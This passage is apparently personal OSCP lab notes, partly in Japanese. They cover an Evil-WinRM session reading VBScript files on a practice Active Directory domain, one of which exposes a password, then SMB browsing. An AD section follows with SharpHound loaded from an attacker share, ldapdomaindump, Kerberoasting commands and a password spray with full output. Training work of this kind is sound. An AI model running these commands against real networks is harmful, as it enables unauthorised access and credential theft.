â€‚â€‚â€‚â€‚Wscript.Echo "Mailbox legacy distinguished name: " & _
â€‚â€‚â€‚â€‚â€‚â€‚â€‚â€‚objItem.MailboxLegacyDN
â€‚â€‚â€‚â€‚Wscript.Echo "Messaging operation count: " & _
â€‚â€‚â€‚â€‚â€‚â€‚â€‚â€‚objItem.MessagingOperationRate
â€‚â€‚â€‚â€‚Wscript.Echo "Open attachment count: " & _
â€‚â€‚â€‚â€‚â€‚â€‚â€‚â€‚objItem.OpenAttachmentCount
â€‚â€‚â€‚â€‚Wscript.Echo "Open folder count: " & objItem.OpenFolderCount
â€‚â€‚â€‚â€‚Wscript.Echo "Open message count: " & objItem.OpenMessageCount
â€‚â€‚â€‚â€‚Wscript.Echo "Other operation rate: " & _
â€‚â€‚â€‚â€‚â€‚â€‚â€‚â€‚objItem.OtherOperationRate
â€‚â€‚â€‚â€‚Wscript.Echo "Progress operation rate: " & _
â€‚â€‚â€‚â€‚â€‚â€‚â€‚â€‚objItem.ProgressOperationRate
â€‚â€‚â€‚â€‚Wscript.Echo "Row ID: " & objItem.RowID
â€‚â€‚â€‚â€‚Wscript.Echo "Server name: " & objItem.ServerName
â€‚â€‚â€‚â€‚Wscript.Echo "Storage group name: " & objItem.StorageGroupName
â€‚â€‚â€‚â€‚Wscript.Echo "Store name: " & objItem.StoreName
â€‚â€‚â€‚â€‚Wscript.Echo "Store type: " & objItem.StoreType
â€‚â€‚â€‚â€‚Wscript.Echo "Stream operation rate: " & _
â€‚â€‚â€‚â€‚â€‚â€‚â€‚â€‚objItem.StreamOperationRate
â€‚â€‚â€‚â€‚Wscript.Echo "Table operation rate: " & _
â€‚â€‚â€‚â€‚â€‚â€‚â€‚â€‚objItem.TableOperationRate
â€‚â€‚â€‚â€‚Wscript.Echo "Total operation rate: " & _
â€‚â€‚â€‚â€‚â€‚â€‚â€‚â€‚objItem.TotalOperationRate
â€‚â€‚â€‚â€‚Wscript.Echo "Transfer operation rate: " & _
â€‚â€‚â€‚â€‚â€‚â€‚â€‚â€‚objItem.TransferOperationRate
â€‚â€‚â€‚â€‚Wscript.Echo
```
```powershell
*Evil-WinRM* PS C:\Scripts> type C:\Scripts\dns_update.vbs
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
â€‚â€‚â€‚â€‚& "{impersonationLevel=impersonate}!\\" & strComputer & _
â€‚â€‚â€‚â€‚â€‚â€‚â€‚â€‚"\root\MicrosoftDNS")

Set colItems = objWMIService.ExecQuery _
â€‚â€‚â€‚â€‚("Select * from MicrosoftDNS_Zone Where Name = 'oscp.exam'")

For Each objItem in colItems
â€‚â€‚â€‚â€‚objItem.UpdateFromDS()
Next
```
```powershell
*Evil-WinRM* PS C:\Scripts> type C:\Scripts\tasks.vbs
strCopy = "SqueakyRedDesk111"
Set objIE = CreateObject("InternetExplorer.Application")
objIE.Navigate("about:blank")
objIE.document.parentwindow.clipboardData.SetData "text", strCopy
objIE.Quit

```
```powershell
*Evil-WinRM* PS C:\Scripts> type C:\Scripts\pword_string.vbs
string = "Insert Password Here"
response.write(StrReverse(string))
Set WshShell = CreateObject("WScript.Shell")
Set oExec = WshShell.Exec("clip")

Set oIn = oExec.stdIn

oIn.WriteLine string
oIn.Close

*Evil-WinRM* PS C:\Scripts> type date_time.vbs
response.write("Today's date is " & Date())
response.write("<br>")
response.write("The time is " & Time())
*Evil-WinRM* PS C:\Scripts> dns.vbs
The term 'dns.vbs' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ dns.vbs
+ ~~~~~~~
    + CategoryInfo          : ObjectNotFound: (dns.vbs:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Scripts> type dns.vbs
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
â€‚â€‚â€‚â€‚& "{impersonationLevel=impersonate}!\\" & strComputer & _
â€‚â€‚â€‚â€‚â€‚â€‚â€‚â€‚"\root\MicrosoftDNS")

Set colItems = objWMIService.ExecQuery("Select * From MicrosoftDNS_Cache")

For Each objItem in colItems
â€‚â€‚â€‚â€‚objItem.ClearCache()
Next
*Evil-WinRM* PS C:\Scripts> type firewall.vbs
Set objFirewall = CreateObject("HNetCfg.FwMgr")
Set objPolicy = objFirewall.LocalPolicy.CurrentProfile

Set objAdminSettings = objPolicy.RemoteAdminSettings
objAdminSettings.Enabled = FALSE
*Evil-WinRM* PS C:\Scripts> type greeting.vbs
<!DOCTYPE html>
<html>
<body>

<%
i=hour(time)
If i <  10 Then
  response.write("Good morning!")
Else
  response.write("Have a nice day!")
End If
%>

</body>

```


- smbにも接続してみた
```powershell
12949503 blocks of size 4096. 8384060 blocks available
smb: \oscp.exam\scripts\> cd ../
smb: \oscp.exam\> ls DfsrPrivate
  DfsrPrivate                      DHSr        0  Thu Oct 10 04:57:15 2024

                12949503 blocks of size 4096. 8384060 blocks available
smb: \oscp.exam\> ls
  .                                   D        0  Thu Oct 10 04:57:15 2024
  ..                                  D        0  Thu Oct 10 04:57:15 2024
  DfsrPrivate                      DHSr        0  Thu Oct 10 04:57:15 2024
  Policies                            D        0  Thu Oct 10 05:00:54 2024
  scripts                             D        0  Thu Oct 10 04:50:41 2024

                12949503 blocks of size 4096. 8384060 blocks available
smb: \oscp.exam\> get DfsrPrivate
NT_STATUS_FILE_IS_A_DIRECTORY opening remote file \oscp.exam\DfsrPrivate
smb: \oscp.exam\> 
```
```powershell
──(koshi㉿kali)-[~/PEN-200/AD/SRV22]
└─$ smbclient -U 'b.martin' \\\\172.16.115.200\\NETLOGON 
Password for [WORKGROUP\b.martin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Oct 10 04:50:41 2024
  ..                                  D        0  Thu Oct 10 04:50:41 2024

                12949503 blocks of size 4096. 8384060 blocks available

```
```powershell

```




---
---

# AD

## Auto w/ BloodHound

```zsh
# Attacker(作成済みのSMB共有を使う)
cp /opt/bloodhound/SharpHound.ps1 share
```
```powershell
# Target(smb共有をすでに使っているとしてnet useはスキップ)
powershell -ep bypass
net use \\<AttackerIP>\share /user:username pw
Import-Module \\<AttackerIP>\share\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory \\<AttackerIP>\share -ZipFileName 'audit.zip'
```

```powershell
powershell -ep bypass -c 'import-module .\powerview.ps1; Get-NetUser | select cn'
```

```zsh
netexec smb 172.16.115.0/24 -u b.martin -p 'MartiniAllNight222' --sessions
```

```zsh
ldapdomaindump -u 'oscp.exam\b.martin' -p 'MartiniAllNight222' 172.16.115.10
```

```
netexec ldap 172.16.115.10 -u b.martin -p 'MartiniAllNight222' --kerberoast kerb.txt
```

martinのパスワードでスプレー
```zsh
─$ subl ad_usernames.txt 
                                                                                      
┌──(koshi㉿kali)-[~/PEN-200/AD/SRV22]
└─$ subl ad_usernames.txt
                                                                                      
┌──(koshi㉿kali)-[~/PEN-200/AD/SRV22]
└─$ nxc smb targets.txt -u ad_usernames.txt -p 'MartiniAllNight222' --continue-on-success
SMB         172.16.115.202  445    SRV22            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SRV22) (domain:oscp.exam) (signing:False) (SMBv1:False)
SMB         172.16.115.200  445    DC20             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC20) (domain:oscp.exam) (signing:True) (SMBv1:False)
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\ADMINISTRATOR:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\KRBTGT:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\R.GALLAGHER:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\S.FISCHER:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\F.HATFIELD:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\B.CROSS:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\J.KOLE:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\D.HALL:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\W.BYRD:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\L.EVGENY:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\GUEST:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [+] oscp.exam\B.MARTIN:MartiniAllNight222
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\A.BAILEY:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\R.ANDREWS:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\C.DEAN:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\T.FUCHS:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\K.FREEMAN:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\P.GETHIN:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\C.ROGERS:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\S.TUCKER:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\M.NEWMAN:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\B.WILLIAMS:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\V.SKINNER:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\O.HUGHES:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\U.GREGORY:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\E.DDWARDS:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\V.PERRY:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.202  445    SRV22            [-] oscp.exam\IUSR:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.200  445    DC20             [-] oscp.exam\ADMINISTRATOR:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.200  445    DC20             [-] oscp.exam\KRBTGT:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.200  445    DC20             [-] oscp.exam\R.GALLAGHER:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.200  445    DC20             [-] oscp.exam\S.FISCHER:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.200  445    DC20             [-] oscp.exam\F.HATFIELD:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.200  445    DC20             [-] oscp.exam\B.CROSS:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.200  445    DC20             [-] oscp.exam\J.KOLE:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.200  445    DC20             [-] oscp.exam\D.HALL:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.200  445    DC20             [-] oscp.exam\W.BYRD:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.200  445    DC20             [-] oscp.exam\L.EVGENY:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.200  445    DC20             [-] oscp.exam\GUEST:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.200  445    DC20             [+] oscp.exam\B.MARTIN:MartiniAllNight222
SMB         172.16.115.200  445    DC20             [-] oscp.exam\A.BAILEY:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.200  445    DC20             [-] oscp.exam\R.ANDREWS:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.200  445    DC20             [-] oscp.exam\C.DEAN:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.200  445    DC20             [-] oscp.exam\T.FUCHS:MartiniAllNight222 STATUS_LOGON_FAILURE                                                           
SMB         172.16.115.200  445    DC20             [-] oscp.exam\K.FREEMAN:MartiniAllNight222 STATUS_LOGON_FAILURE                                                         
SMB         172.16.115.200  445    DC20             [-] oscp.exam\P.GETHIN:MartiniAllNight222 STATUS_LOGON_FAILURE                                                          
SMB         172.16.115.200  445    DC20             [-] oscp.exam\C.ROGERS:MartiniAllNight222 STATUS_LOGON_FAILURE                                                          
SMB         172.16.115.200  445    DC20             [-] oscp.exam\S.TUCKER:MartiniAllNight222 STATUS_LOGON_FAILURE                                                          
SMB         172.16.115.200  445    DC20             [-] oscp.exam\M.NEWMAN:MartiniAllNight222 STATUS_LOGON_FAILURE                                                          
SMB         172.16.115.200  445    DC20             [-] oscp.exam\B.WILLIAMS:MartiniAllNight222 STATUS_LOGON_FAILURE                                                        
SMB         172.16.115.200  445    DC20             [-] oscp.exam\V.SKINNER:MartiniAllNight222 STATUS_LOGON_FAILURE                                                         
SMB         172.16.115.200  445    DC20             [-] oscp.exam\O.HUGHES:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.200  445    DC20             [-] oscp.exam\U.GREGORY:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.200  445    DC20             [-] oscp.exam\E.DDWARDS:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.200  445    DC20             [-] oscp.exam\V.PERRY:MartiniAllNight222 STATUS_LOGON_FAILURE
SMB         172.16.115.200  445    DC20             [-] oscp.exam\IUSR:MartiniAllNight222 STATUS_LOGON_FAILURE
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
                                            
```


- 意味なし